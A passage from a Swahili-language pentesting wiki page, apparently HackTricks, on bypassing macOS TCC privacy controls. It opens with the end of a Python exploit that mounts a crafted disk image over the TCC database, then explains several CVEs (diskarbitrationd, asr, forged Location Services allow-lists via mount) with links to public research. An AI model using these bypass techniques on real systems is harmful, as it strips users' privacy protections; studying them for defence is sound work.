    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Angalia **exploit kamili** katika [**maelezo ya awali**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Kama ilivyoelezwa katika [maelezo ya awali](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia vibaya `diskarbitrationd`.<sup>[[16]](#references)</sup>

Function `DADiskMountWithArgumentsCommon` kutoka kwenye framework ya umma ya `DiskArbitration` ilifanya ukaguzi wa usalama. Hata hivyo, inawezekana kuikwepa kwa kuita `diskarbitrationd` moja kwa moja na hivyo kutumia vipengele vya `../` kwenye path na symlinks.

Hii ilimwezesha mshambulizi kufanya mounts kiholela katika eneo lolote, ikiwemo juu ya database ya TCC, kutokana na entitlement `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kui-mount mahali pengine, hivyo kukwepa ulinzi wa TCC.

### CVE-2022-22655 - Location Services

Location Services **hazihifadhiwi** kwenye database ya TCC kama huduma nyingine. Zinasimamiwa na `locationd`, ambayo huhifadhi allow-list yake yenyewe katika **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Kila ingizo limefungamanishwa na client (bundle ID au njia ya executable) na lina sehemu kama `Authorized`, `BundleId`, `Executable` na `Registered`.<sup>[[4]](#references)</sup>

Faili la `clients.plist` lenyewe linalindwa na Sandbox/TCC na haliwezi kuhaririwa hata ukiwa root — lakini **`/var/db/locationd/` halikulindwa dhidi ya kuwekwa mount**. Kwa hiyo, mshambulizi anayeendesha mfumo kama root angeweza kutengeneza disk image yenye `clients.plist` yake mwenyewe (ambayo binary yake imewekewa alama ya `Authorized`), kuiweka mount juu ya directory hiyo, kisha kuwasha upya `locationd` ili allow-list hiyo ghushi ianze kutumika.<sup>[[3]](#references)</sup>

> [!TIP]
> Huu ni mpangilio uleule kama wa TCC bypass za `hdiutil`/`mount` zilizo hapo juu: *faili* linalindwa, lakini *directory* ilimokaa halijalindwa, kwa hiyo unabadilisha directory nzima badala ya faili.

## Kupitia programu za startup


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Kupitia grep

Mara kadhaa, faili huhifadhi taarifa nyeti kama barua pepe, nambari za simu, ujumbe... katika maeneo yasiyolindwa (jambo ambalo Apple hulichukulia kuwa vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**ilifanya kazi zamani**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine inayotumia matukio ya [**CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: Kukwepa mfumo wa macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Kukwepa ulinzi wa faragha wa mtumiaji wa macOS TCC kwa bahati mbaya na kwa makusudi](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Kukwepa TCC Location Services (ripoti ya awali)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego yuko wapi duniani: Kutumia vibaya Location Services kwenye macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass huiba data kutoka iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (vigezo vya mazingira vya SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Ruhusu entitlement ya vigezo vya mazingira vya DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: runtime iliyoimarishwa](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [TCC bypass ya Zero-Day yagunduliwa kwenye malware ya XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Kinachotokea kwenye Mac yako, hubaki kwenye iCloud ya Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Vulnerability mpya ya macOS, "powerdir," inaweza kusababisha ufikiaji usioidhinishwa wa data ya mtumiaji](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Badilisha home directory na ukwepe TCC, yaani CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Cheza muziki na ukwepe TCC, yaani CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Jinsi ya kuiba (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Kukwepa TCC kwa kutumia Telegram kwenye macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Kufichua vulnerabilities za Apple: Ukaguzi wa diskarbitrationd na storagekitd, Sehemu ya 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks na CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Uthibitisho wa dhana](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Kuweka vigezo vya mazingira kwenye OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass na privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass kwa kuweka mount juu ya database ya TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Njia 20+ za kukwepa mifumo ya faragha ya macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Ushindi mkubwa dhidi ya TCC - Njia 20+ MPYA za kukwepa mifumo ya faragha ya MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Kutoka Spotlight hadi Apple Intelligence — Kutumia vibaya 0day ili kuiba data inayowezesha macOS AI](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
